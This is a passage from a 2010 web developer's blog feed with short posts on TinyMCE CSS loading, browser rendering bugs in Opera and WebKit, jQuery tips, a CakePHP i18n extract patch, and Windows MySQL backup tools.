rather have it with my other CSS files.&lt;/p&gt;

&lt;p&gt;So I defined a custom &lt;code&gt;content_css&lt;/code&gt; to point to my file. I also had to update
the setup method to mark the file as already loaded. But this time, as the
file is loaded on a per instance basis, this is the &lt;code&gt;editor.dom.files&lt;/code&gt; that I
have to update, not the general &lt;code&gt;tinymce.DOM&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Fortunatly, the latest tinyMCE version expose their event API, so it was just
a matter of defining the following event in the main setup :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;tinymce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;baseUrl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;caracoleDoNotInclude&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onPreInit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;baseUrl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;js/vendors/tiny_mce/themes/advanced/skins/caracole/content.css&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Edit :&lt;/h2&gt;

&lt;p&gt;Note that in the latest tinyMCE version, the code is slightly different
because you have to call a special method on the url before adding it to the
&lt;code&gt;editor.dom.files&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onPreInit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;baseURI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toAbsolute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;http://&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/js/vendors/tiny_mce/themes/advanced/skins/caracole/content.css&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Rendering bug with generated content on form fields in Opera</title>
   <link href="http://blog.pixelastic.com/2010/04/12/rendering-bug-with-generated-content-on-form-fields-in-opera/"/>
   <updated>2010-04-12T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/04/12/rendering-bug-with-generated-content-on-form-fields-in-opera</id>
   <content type="html">&lt;p&gt;If you try the following code in Opera 10.51, you&amp;#39;ll have some weird rendering
bug :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;style&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nc&quot;&gt;.test&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;:after&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;This should be on red background&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;red&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
 Text input : &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;I&amp;#39;m unstyled&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;test&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The generated content is added to the page, but the background color isn&amp;#39;t
rendered. Worse, the input lose all styling, it does not have a background
color nor borders anymore.&lt;/p&gt;

&lt;p&gt;The same effect also apply to every &lt;code&gt;input&lt;/code&gt;(&lt;code&gt;radio&lt;/code&gt;, &lt;code&gt;checkbox&lt;/code&gt;and
&lt;code&gt;password&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;On a &lt;code&gt;select&lt;/code&gt; tag, the generated content correctly have it&amp;#39;s background color,
but still lose all styling.&lt;/p&gt;

&lt;p&gt;On a &lt;code&gt;textarea&lt;/code&gt;, the styling is gone too, and the background color is here.
Well, sort of, it is actually cropped after a while and the end of the text is
on transparent background.&lt;/p&gt;

&lt;p&gt;I sent a bug report to Opera about that.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;files/2010/04/12/4bc2f9103d4c2.jpg&quot; alt=&quot;Opera, input  generated content bug&quot;&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Opening a new tab using Ctrl+Click on Opera</title>
   <link href="http://blog.pixelastic.com/2010/04/12/opening-a-new-tab-using-ctrl-click-on-opera/"/>
   <updated>2010-04-12T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/04/12/opening-a-new-tab-using-ctrl-click-on-opera</id>
   <content type="html">&lt;p&gt;One thing that bugs me everytime I use Opera are the weird keyboard shortcuts.
You open link in a new tab by using the middle mouse button (classic) or
Shift+click (less classic, we are accustomed to use the Ctrl+Click,
Shift+Click being used to open in a new window).&lt;/p&gt;

&lt;p&gt;Today it was bugging me one too many times, so I decided to use the power of
AutoHotKey to help fix this.&lt;/p&gt;

&lt;p&gt;Here is the little snippet I added to my default AutoHotKey script :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ahk&quot; data-lang=&quot;ahk&quot;&gt;&lt;span class=&quot;c-Singleline&quot;&gt;;Â Â Â  Â Â Â  Open page in new tab in Opera using Ctrl + Click&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;#ifWinActive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ahk_class&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OpWindow&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LButton&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LButton&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;#IfWinActive&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It basically catch every Shift+Click in Opera and return a Ctrl+Click instead,
allowing me to finally open tabs the way I&amp;#39;m used to.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Knowing if an element is in the DOM using jQuery</title>
   <link href="http://blog.pixelastic.com/2010/04/10/knowing-if-an-element-is-in-the-dom-using-jquery/"/>
   <updated>2010-04-10T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/04/10/knowing-if-an-element-is-in-the-dom-using-jquery</id>
   <content type="html">&lt;p&gt;If you ever need to know if the element you have a reference to is really in
your page (or if it is an old reference to an element you&amp;#39;ve already
replaced), you can use the &lt;code&gt;$.contains(container, contained)&lt;/code&gt; method.&lt;/p&gt;

&lt;p&gt;I was just working on an AJAX paginated list of elements and I kept references
to my &lt;code&gt;table&lt;/code&gt; in vars to avoid re-querying it each time. But this reference
where still &amp;#39;correct&amp;#39; (ie. not null) even after having replaced the element
with a new one (using .&lt;code&gt;replaceWith()&lt;/code&gt; and even &lt;code&gt;.empty()&lt;/code&gt; and &lt;code&gt;.remove()&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;I added a check to see if the element was really in the DOM before using it,
and if not requerying it and re-saving it in var&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>missing data in jQuery Ajax event ajaxSuccess</title>
   <link href="http://blog.pixelastic.com/2010/04/09/missing-data-in-jquery-ajax-event-ajaxsuccess/"/>
   <updated>2010-04-09T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/04/09/missing-data-in-jquery-ajax-event-ajaxsuccess</id>
   <content type="html">&lt;p&gt;jQuery provides a nifty set of Ajax events that one could define to fire
methods whenever an ajax request starts, stop, failed or succeed. It is quite
useful actually, to display visual indicator once and for all without having
to define the various callback on each ajax call.&lt;/p&gt;

&lt;p&gt;But it has one flaw. The &lt;code&gt;ajaxSuccess&lt;/code&gt;callback only give access to the
&lt;code&gt;event&lt;/code&gt;, &lt;code&gt;XMLHttpRequest&lt;/code&gt;object and the option object. There is no direct way
to get the return data from the call.&lt;/p&gt;

&lt;p&gt;Well, you can still access it from the &lt;code&gt;XMLHttpRequest responseText&lt;/code&gt; attribute
but it is then your job to parse it according to its type, duplicating some of
the code already called in the jQuery core.&lt;/p&gt;

&lt;p&gt;You can use the &lt;code&gt;$.httpData&lt;/code&gt; to directly parse it, giving the XHR as first
argument and the data type as the second one.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;#ajaxIndicator&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;ajaxSuccess&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;httpData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dataType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>CSS rule to target only Firefox</title>
   <link href="http://blog.pixelastic.com/2010/04/05/firefox-only-css-rules/"/>
   <updated>2010-04-05T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/04/05/firefox-only-css-rules</id>
   <content type="html">&lt;p&gt;I just found (via &lt;a href=&quot;http://enure.net/post/article/serve-css-to-only-%0Afirefox&quot;&gt;enure.net&lt;/a&gt;) a CSS rule using proprietary Mozilla filter that would allow one to
specifically target Mozilla.&lt;/p&gt;

&lt;p&gt;I&amp;#39;m not a huge fan of CSS hacks like that, I usually restrain them to the bare
minimum of IE conditional comments. But in some edge cases, it is sometimes
useful, if you really don&amp;#39;t have other options.&lt;/p&gt;

&lt;p&gt;I&amp;#39;d like to find the equivalent rules (using proprietary rules, no parser bug)
for Safari, Chrome and Opera&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;k&quot;&gt;@-moz-document&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;url-prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;red&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Updated CSSTidy files</title>
   <link href="http://blog.pixelastic.com/2010/04/04/updated-csstidy-files/"/>
   <updated>2010-04-04T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/04/04/updated-csstidy-files</id>
   <content type="html">&lt;p&gt;CSSTidy allows you to optimize your CSS files by aggregating them in one
unique file, removing useless spaces and comments as well as running some
other optimizations on multiple declarations and shorthand notations.&lt;/p&gt;

&lt;p&gt;But if, like me, you&amp;#39;re still using the 1.3 version available on the official
website, you may have run into issues when dealing with the latest CSS3
goodies.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve been hacking this library in the last year, adding support for &lt;code&gt;@font-
face&lt;/code&gt; and for proprietary prefixed properties values, but today I was faced
with some other issues that I wasn&amp;#39;t able to resolve.&lt;/p&gt;

&lt;p&gt;CSSTidy does not use regexp to parse the file, it reads it one char at a time
and does its optimization at the same time, and it is sometimes quite hard to
follow.&lt;/p&gt;

&lt;p&gt;Anyway, I just discovered that the Sourceforge page of the project is still up
and running and that a commit was added today, so the project is not dead ! I
also posted two bug reports and one (dummy) patch.&lt;/p&gt;

&lt;p&gt;Here&amp;#39;s the link, you got a download link at the bottom :
http://csstidy.svn.sourceforge.net/viewvc/csstidy/trunk/&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>-webkit-box-shadow inset value</title>
   <link href="http://blog.pixelastic.com/2010/04/03/webkit-box-shadow-inset-value/"/>
   <updated>2010-04-03T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/04/03/webkit-box-shadow-inset-value</id>
   <content type="html">&lt;p&gt;Webkit browsers (Safari and Chrome) have the &lt;code&gt;-webkit-box-shadow&lt;/code&gt; property
defined to add shadows to elements. Shadow can either be outside the box, or
inside it (using the inset parameter).&lt;/p&gt;

&lt;p&gt;Unfortunatly, only the latest Webkit nightlies have the &lt;code&gt;inset&lt;/code&gt; parameter
functionnal, Safari 4 does not.&lt;/p&gt;

&lt;p&gt;Chrome does indeed have the inset parameter, but it also have &lt;a href=&quot;http://code.google.com/p/chromium/issues/detail?id=25334&quot;&gt;a
bug&lt;/a&gt; when used in
conjunction with the &lt;code&gt;-webkit-border-radius&lt;/code&gt; property : the inset shadow is
visible &amp;quot;behind&amp;quot; the element where the borders are rounded.&lt;/p&gt;

&lt;p&gt;This bug does not occur on Mac, but as I have no way to target a certain OS
when writing CSS rules, I decided to remove &lt;code&gt;inset box-shadow&lt;/code&gt; for webkit
browsers on my actual projects, I may re-insert them later when both issues
will be fixed.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>cakePHP i18n extract and plugins</title>
   <link href="http://blog.pixelastic.com/2010/04/02/cakephp-i18n-extract-and-plugins/"/>
   <updated>2010-04-02T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/04/02/cakephp-i18n-extract-and-plugins</id>
   <content type="html">&lt;p&gt;Cake has a lot of wonderful tools in its console. One of them is the &lt;code&gt;i18n
extract&lt;/code&gt; task that reads every file of your app, and extract strings that
should be translated (used with &lt;code&gt;__()&lt;/code&gt;, &lt;code&gt;__d()&lt;/code&gt;, etc).&lt;/p&gt;

&lt;p&gt;With cake 1.3 RC3 it even stored each domain string in its own &lt;code&gt;.pot&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;But, as far as I know (I&amp;#39;ve posted on the google group about that, maybe
someone will show me where I&amp;#39;m wrong), the console task is limited when
dealing with plugins.&lt;/p&gt;

&lt;p&gt;Let&amp;#39;s say I have a plugin in my app. I&amp;#39;m using &lt;code&gt;__d(&amp;#39;plugin_name&amp;#39;, &amp;#39;My plugin
string&amp;#39;)&lt;/code&gt; in my plugin and &lt;code&gt;__(&amp;#39;My app string&amp;#39;)&lt;/code&gt; in the main app.&lt;/p&gt;

&lt;p&gt;If I run the &lt;code&gt;cake i18n extract&lt;/code&gt; in my plugin directory, it will correctly
generate the &lt;code&gt;.pot&lt;/code&gt;file in my plugin &lt;code&gt;locale/&lt;/code&gt; folder.&lt;/p&gt;

&lt;p&gt;But if I run it in the main app, it will scan every plugin file and thus
finding any plugin string and save them in the &lt;code&gt;default.pot&lt;/code&gt; or in its own
&lt;code&gt;plugin_name.pot&lt;/code&gt; file (depending on the value of the merge option).&lt;/p&gt;

&lt;p&gt;I don&amp;#39;t need the &lt;code&gt;plugin_name.pot&lt;/code&gt; files in &lt;code&gt;app/locale&lt;/code&gt;, I already have them
in &lt;code&gt;app/plugins/plugin_name/locale&lt;/code&gt;. I know it&amp;#39;s no big deal, I just have to
delete the useless files created every time I run the &lt;code&gt;cake i18n extract&lt;/code&gt; on
the main app but it is kind of irritating.&lt;/p&gt;

&lt;p&gt;So I updated the &lt;code&gt;cake/console/libs/tasks&lt;/code&gt; to add a new option to the task,
named &amp;#39;&lt;code&gt;plugins&lt;/code&gt;&amp;#39; (value : yes/no. Default to no).&lt;/p&gt;

&lt;p&gt;If set to no, the extract task will skip every plugin directory when
extracting files. This way, I have no more clutter, it only extract string
that are in the app.&lt;/p&gt;

&lt;p&gt;All I had to do was updating the &lt;code&gt;execute()&lt;/code&gt; method, and replacing the end of
the method (from line 152) with this one :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$this-&amp;gt;params[&amp;#39;plugins&amp;#39;] = isset($this-&amp;gt;params[&amp;#39;plugins&amp;#39;]) ? $this-&amp;gt;params[&amp;#39;plugins&amp;#39;] : &amp;#39;no&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;if (empty($this-&amp;gt;__files)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if ($this-&amp;gt;params[&amp;#39;plugins&amp;#39;]==&amp;#39;yes&amp;#39;) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $this-&amp;gt;__searchFiles();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  } else {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $this-&amp;gt;__searchFilesExcludePlugins();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And then add this method to the class :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function __searchFilesExcludePlugins() {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  foreach ($this-&amp;gt;__paths as $path) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $Folder = new Folder($path);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $filelist = $Folder-&amp;gt;tree($path);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    foreach($filelist[1] as &amp;amp;$file) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      // We discard plugins&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      if (strpos(str_replace($path, &amp;#39;&amp;#39;, $file), DS.&amp;#39;plugins&amp;#39;)===0) continue;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      // We keep those that match the pattern&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      if (!preg_match(&amp;#39;/^.*\.(php|ctp|thtml|inc|tpl)$/i&amp;#39;, $file)) continue;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      $this-&amp;gt;__files[]= $file;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Generating salt values</title>
   <link href="http://blog.pixelastic.com/2010/03/31/generating-salt-values/"/>
   <updated>2010-03-31T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/03/31/generating-salt-values</id>
   <content type="html">&lt;p&gt;Wordpress made available a nice tool to generate fairly complicated strings,
perfectly usable as salt value for all your password hashing process.&lt;/p&gt;

&lt;p&gt;As I&amp;#39;m often heading to this page to generate new ones on new projects I
thougt I may share the link with you :&lt;/p&gt;

&lt;p&gt;https://api.wordpress.org/secret-key/1.1/bbpress/&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Mysql auto backup</title>
   <link href="http://blog.pixelastic.com/2010/03/29/mysql-auto-backup/"/>
   <updated>2010-03-29T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/03/29/mysql-auto-backup</id>
   <content type="html">&lt;p&gt;I&amp;#39;m in the process of automating the backup of all the mysql databases of my
clients&amp;#39; website. We never know what can happen, so having a backup of all
this data is really really important.&lt;/p&gt;

&lt;p&gt;MySQL data contains all the data added by the user, it means that unless you
make regular backup of this data, you can&amp;#39;t regenerate it.&lt;/p&gt;

&lt;p&gt;I have multiple clients, with several websites each and an equivalent number
of databases. I wanted to store a backup of all those on my local drive, to
prevent any server crash problem.&lt;/p&gt;

&lt;p&gt;I wanted a daily backup, and as my working station is on Windows XP I tried to
find a simple software to do just that.&lt;/p&gt;

&lt;p&gt;There is a little tool called mysqldump on linux that does just that : saving
an entire database in a single file. Joined with some cron job and rotating
the files it shouldn&amp;#39;t be hard to implement.&lt;/p&gt;

&lt;p&gt;But finding a software to do that on Windows is just terrible. I&amp;#39;ve been
searching for them for more that 2 hours now and everything I find is
horrible.&lt;/p&gt;

&lt;p&gt;At first I found &lt;a href=&quot;http://www.swordsky.com/&quot;&gt;AutoBackup for Mysql&lt;/a&gt; but the
software is written in something that even myself can&amp;#39;t call English (and I
know that my prose is not exactly Shakespeare). I had to click on some options
to guess what it was supposed to do... I guess after some practice and once
the tasks are scheduled it doesn&amp;#39;t matter anymore but the trial version can&amp;#39;t
save more that 50 records per table and the price of the full version (~100$)
is by far too expensive.&lt;/p&gt;

&lt;p&gt;By continuing my quest, I ended up downloading this same software under
different names.&lt;/p&gt;

&lt;p&gt;Then I found &lt;a href=&quot;http://www.richtsoft.com/mod.php?theme=richtsoft&amp;amp;them%0Ae=richtsoft&amp;amp;mod=webpage&amp;amp;op=view&amp;amp;wid=18&quot;&gt;DumpTimer&lt;/a&gt; and its brownish interface. It is also
a great example of ergonomic errors : window too small forcing to scroll to
reveal the options, nonsense message boxes popping, large amount of typo
errors, limited choice of options.&lt;/p&gt;

&lt;p&gt;But it does the job, in a very basic form, but it does it right. I could save
my list of servers, check which databases and tables to save (well, all of
them) and choose where to save them. There also was an option to copy them to
another database, but I didn&amp;#39;t tried that.&lt;/p&gt;

&lt;p&gt;One of the main caveats was that it could only save the most recent backup,
there was no way to save, say, the last 30 days.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Viddler utf8 encoding issue with video description</title>
   <link href="http://blog.pixelastic.com/2010/03/25/viddler-utf8-encoding-issue-with-video-description/"/>
   <updated>2010-03-25T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/03/25/viddler-utf8-encoding-issue-with-video-description</id>
   <content type="html">&lt;p&gt;It seems that Viddler changed something on their video API in the middle of
January, and it broke &lt;code&gt;utf8&lt;/code&gt;support.&lt;/p&gt;

